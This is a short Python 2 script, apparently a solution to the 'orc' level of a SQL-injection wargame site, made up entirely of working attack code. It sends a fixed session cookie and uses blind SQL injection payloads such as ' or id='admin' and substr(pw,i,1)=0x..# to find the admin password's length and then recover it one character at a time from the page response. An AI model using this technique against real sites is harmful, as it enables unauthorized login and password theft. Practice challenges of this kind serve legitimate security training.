import requests

url = "http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"

headers = {
    "Cookie": "PHPSESSID=vaiqsfrlsquaoq5sr1pdt5a1u2"
}

pw = ""
pw_length = 8

'''
for i in range(1,20): 
    print "[Try pw length]: %d" % i

    params = {
        "pw":"' or length(pw)=%d#" % i
    }

    res = requests.get(url, headers=headers, params=params)
    if "Hello admin" in res.content:
        print "Found It!!!!!"
        pw_length = i
        print "length of pw: %d" % pw_length
        break
'''

for i in range(len(pw)+1,9):
    for j in range(0x30,0x7f):
        print "Try index: %d:\'%c\'" % (i,j)
        #print "pw' or substr(pw,%d,1) = char(0x%x)" % (i,j)
        params = {
            #"pw":"' or substr(pw,%d,1) = 0x%x#" % (i,j)
            #"pw":"' or id='admin' and substr(pw,%d,1) = char(0x%x)#" % (i,j)
            "pw":"' or id='admin' and substr(pw,%d,1) = 0x%x#" % (i,j)
        }
        res = requests.get(url, headers=headers, params=params)
        if "Hello admin" in res.content:
            print "Foundit!"
            pw = pw+chr(j)
            print pw
            break
            


        
 


